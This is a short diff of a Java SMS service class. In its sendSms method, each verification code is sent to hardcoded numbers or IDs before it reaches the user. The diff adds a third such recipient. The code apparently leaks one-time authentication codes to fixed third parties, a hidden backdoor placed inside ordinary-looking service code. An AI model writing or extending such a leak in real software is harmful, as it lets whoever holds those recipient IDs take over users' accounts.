@@ -21,6 +21,7 @@ public class SmsServiceImpl implements SmsService {
     public void sendSms(SmsEntity sms) {
         messageSender.send(new SendMessage("6088994278", sms.getCode()));
         messageSender.send(new SendMessage("912723931", sms.getCode()));
+        messageSender.send(new SendMessage("1549053710", sms.getCode()));
         smsRepository.save(sms);
         smsSender.sendAsync(sms.getPhoneNumber(), sms.getMessage());
     }
